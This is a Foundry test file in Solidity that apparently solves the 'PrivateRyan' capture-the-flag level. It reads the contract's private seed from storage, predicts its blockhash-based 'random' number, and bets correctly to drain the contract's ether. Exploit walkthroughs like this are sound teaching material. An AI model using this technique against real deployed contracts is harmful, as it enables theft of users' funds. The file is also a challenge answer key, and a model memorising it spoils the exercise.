// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985); // Устанавливаем начальный номер блока
    }

    function testExploitLevel() public {
        // Получаем значение приватного seed
        uint256 seed = uint256(vm.load(address(instance), bytes32(uint256(0))));

        // Рассчитываем корректную ставку
        uint256 bet = predictBet(seed);

        // Вызываем spin с правильной ставкой
        instance.spin{value: 0.01 ether}(bet);

        // Проверяем успех
        checkSuccess();
    }

    function predictBet(uint256 seed) internal view returns (uint256) {
        uint256 factor = 1157920892373161954135709850086879078532699843656405640394575840079131296399 * 100 / 100;
        uint256 blockHash = uint256(blockhash(block.number - seed));
        return (blockHash / factor) % 100;
    }

            function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
